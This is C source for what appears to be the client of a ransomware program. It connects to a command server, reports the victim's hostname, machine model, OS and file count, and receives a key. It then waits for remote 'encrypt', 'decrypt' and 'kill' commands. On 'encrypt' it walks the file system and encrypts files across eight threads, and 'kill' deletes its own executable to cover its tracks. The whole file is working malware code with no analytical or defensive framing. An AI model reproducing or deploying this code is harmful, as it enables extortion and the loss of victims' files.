#include <stdbool.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "../../headers/client.h"
#include "../../headers/thread.h"
#include "../../headers/watcher.h"
#include "../../headers/globals.h"
#include "../../headers/decrypt_key.h"

const int THREADS_NUMBER = 8;
char *IP = "127.0.0.1";//127.0.0.1

char* get_computer_model() {
    FILE *f = fopen("/sys/devices/virtual/dmi/id/product_name", "r");
    if (!f)
        return strdup("Unknown");

    char tmp[128];
    fgets(tmp, sizeof(tmp), f);
    fclose(f);

    tmp[strcspn(tmp, "\n")] = '\0';
    return strdup(tmp);
}

#define PORT 8080
void *commands_listener(void *arg) {
    int client_fd = *(int *)arg;
    free(arg);

    char buffer[1024];

    while (true){
        int valread = read(client_fd, buffer, sizeof(buffer) -1);

        if (valread > 0 ) {
            buffer[valread] = '\0';
            char *arguments[10] = {0};
            int argc = 0;

            char *token = strtok(buffer, ";");
            while (token != NULL && argc < 10) {
                arguments[argc++] = token;
                token = strtok(NULL, ";");
            }

            if (strcmp(arguments[0], "encrypt") == 0) {
                /*printf("q start\n");
                print_queue(&queue);
                printf("q end\n");*/
                watcher_on = false;
 
                clear_queue(&queue);
                traverse(start_path);
                enqueue(&queue, "END_ENCRYPT");
 
                //printf("start_encryption\n");
                initialize_threads(THREADS_NUMBER, true);
                watcher_on = true;

                pthread_mutex_lock(&gui_mutex);
                pthread_cond_signal(&gui_cond);
                pthread_mutex_unlock(&gui_mutex);
            } else if (strcmp(arguments[0], "decrypt") == 0) {
                //printf("q start\n");
                //print_queue(&queue);
                //printf("q end\n");

                watcher_on = false;
                sleep(2);
                
                clear_queue(&queue);
                traverse(start_path);
                enqueue(&queue, "END_DECRYPT");
                //printf("start_decryption\n");
                initialize_threads(THREADS_NUMBER, false);
            } else if (strcmp(arguments[0], "kill") == 0) {
                //printf("kill himself\n");
                char exe_path[1024];

                ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
                if (len == -1) {
                    perror("readlink failed");
                    return 0;
                }
                exe_path[len] = '\0';

                //printf("Deleting: %s\n", exe_path);

                if (unlink(exe_path) == 0) {
                    printf("Deleted successfully.\n");
                } else {
                    perror("unlink failed");
                }
                exit(0);
            } else {
                for (int i = 0; i < argc; i++) {
                    //printf("%s\n", arguments[i]);
                }
            }
        }
    }
}

void *startclient(void *arg) {
    int status;
    int valread;
    int client_fd;

    struct sockaddr_in serv_addr;

    if ((client_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("socket creation failed\n");
        return 0;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    if (inet_pton(AF_INET, IP, &serv_addr.sin_addr) <= 0) { 
        printf("inet_pton failed\n");
        return 0;
    }
    if ((status = connect(client_fd, (struct sockaddr *) &serv_addr, sizeof(serv_addr))) < 0) {
        printf("connect failed\n");
        return 0;
    }

    char* hey = "PC connected, number of file : ";

    struct utsname name;

    if (uname(&name) == -1) {
        perror("uname");
        return 0;
    }
    char* nodename = name.nodename;
    char* sysname = name.sysname;
    //char* machine = name.machine;
    //char* version = name.version;
    //char* release = name.release;

    int file_number = count(&queue);

    char *model = get_computer_model();

    char ret[523];
    snprintf(ret, sizeof(ret), "%s %d, model: %s, username: %s, OS kernel: %s", hey, file_number, model, nodename, sysname);
    send(client_fd, ret, strlen(ret), 0);
    free(model);

    unsigned char encrypted[256];
    int received = recv(client_fd, encrypted, sizeof(encrypted), 0);
    decrypt_key(encrypted);

    int *clientfd = malloc(sizeof(int));
    *clientfd = client_fd;

    pthread_t command_tid;
    pthread_t watcher_tid;
    pthread_create(&command_tid, NULL, commands_listener, clientfd);
    pthread_create(&watcher_tid, NULL, start_watcher, NULL);
    pthread_join(watcher_tid, NULL);
    pthread_join(command_tid, NULL);
    return 0;
}
